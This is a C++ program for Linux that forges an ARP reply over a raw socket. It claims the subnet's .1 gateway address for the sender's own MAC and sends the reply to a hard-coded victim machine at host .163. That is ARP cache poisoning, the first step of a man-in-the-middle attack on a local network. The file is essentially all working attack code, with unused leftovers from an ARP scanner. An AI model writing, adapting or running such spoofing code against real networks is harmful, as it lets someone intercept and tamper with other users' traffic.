#include <iostream>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iomanip>
#include <thread>

#include <netinet/if_ether.h>
#include <netinet/in.h>

#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>        // hostent

#include <arpa/inet.h>    // inet_addr() ....

#include <linux/if_ether.h>
#include <linux/if_packet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/unistd.h>   // int gethostname(char *name, size_t len);
using namespace std;

#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
#define ETH_ALEN 6
#define IP_ADDR_LEN 4
#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN+ETHER_ARP_LEN

void socket_init(int& sock_r) {
    sock_r = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	
    if (sock_r < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
}

#define IFNAME "ens33"

void getInfo(char* IP, unsigned char* MC, int& index) {
	string ss = IFNAME;
	char* eth_name = &ss[0];

	struct ifreq ifr;
	int sock_r = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock_r < 0) {
		cout << "Error on socket init!\n";
		exit(1);
	}
	strncpy(ifr.ifr_name, (char*) eth_name, sizeof(ifr.ifr_name));

	if (ioctl(sock_r, SIOCGIFADDR, &ifr) < 0) {
		cout << "Error on itoctl -- IP\n";
		exit(1);
	}
	memcpy(IP, ifr.ifr_addr.sa_data + 2, 4);
	// IP = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);

	if (ioctl(sock_r, SIOCGIFINDEX, &ifr) < 0) {
		cout << "Error on itoctl -- IINDEX\n";
		exit(1);
	}
	// cout << "Index: " << ifr.ifr_ifindex << '\n';
	index = ifr.ifr_ifindex;

	if (ioctl(sock_r, SIOCGIFHWADDR, &ifr) < 0) {
		cout << "Error on itoctl -- MAC\n";
		exit(1);
	}
	memcpy(MC, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	close(sock_r);
	// cout << "Get Info Finished\n";
}

void print_result(unsigned char* dst_ip, unsigned char* mac) {
	string ss = "";
	for (int j = 0; j < 4; j++) {
		if (j != 0) ss = ss +  '.';
		ss = ss + to_string((unsigned int) ((unsigned char) dst_ip[j]));
	}
	cout << setfill(' ') << setw(18) << left << ss;
	
	for (int j = 0; j < ETH_ALEN; j++) {
		if (j != 0) cout << ":";
		cout << setw(2) << setfill('0') << uppercase << hex << (unsigned int)((unsigned char) mac[j]);
	}
	cout << '\n';
}

int finish_scan = 0;
char src_ip[4];

int main(int argc, char const *argv[]) {

    cout << "Sending arp reply...";    

	unsigned char dst_mac_addr[ETH_ALEN] = { 0x00, 0x0c, 0x29, 0xe0, 0xed, 0x97 };
	unsigned char src_mac_addr[ETH_ALEN];
	struct in_addr src_in_addr, dst_in_addr;
	char dst_ip[4];
	int index;
	
	getInfo(src_ip, src_mac_addr, index);
	for (int i = 0; i < 3; i++) dst_ip[i] = src_ip[i];

	char buf[ETHER_ARP_PACKET_LEN];
	memset(buf, 0, sizeof(buf));
	
	struct ether_header* eth_header = (struct ether_header*) buf;
	memcpy(eth_header -> ether_shost, src_mac_addr, ETH_ALEN);
	memcpy(eth_header -> ether_dhost, dst_mac_addr, ETH_ALEN);
	eth_header -> ether_type = htons(ETHERTYPE_ARP);	

	struct ether_arp* arp_packet = (struct ether_arp*) malloc(ETHER_ARP_LEN);

	arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
	arp_packet -> arp_pro = htons(ETHERTYPE_IP);
	arp_packet -> arp_hln = ETH_ALEN;
	arp_packet -> arp_pln = IP_ADDR_LEN;
	arp_packet -> arp_op  = htons(ARPOP_REPLY);

	src_ip[3] = 1;

	memcpy(arp_packet -> arp_sha, src_mac_addr, ETH_ALEN);
	memcpy(arp_packet -> arp_tha, dst_mac_addr, ETH_ALEN);
	memcpy(arp_packet -> arp_spa, src_ip, IP_ADDR_LEN);
	

	// Sockaddr
	struct sockaddr_ll send_addr;
	memset(&send_addr, 0, sizeof(send_addr));
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_pkttype = PACKET_BROADCAST;
    send_addr.sll_ifindex = index;
    send_addr.sll_halen = 0x06;
    memset(send_addr.sll_addr, 0xff, 6);


	int sock_r;
	socket_init(sock_r);

    for (int i = 2; i < 254; i++) {
		dst_ip[3] = 163;
		memcpy(arp_packet -> arp_tpa, dst_ip, IP_ADDR_LEN);

		memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

		if (sendto(sock_r, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
			cout << "Sendto Error!\n";	
		}
		break;
	}
	finish_scan = 1;

	close(sock_r);
    return 0;
}
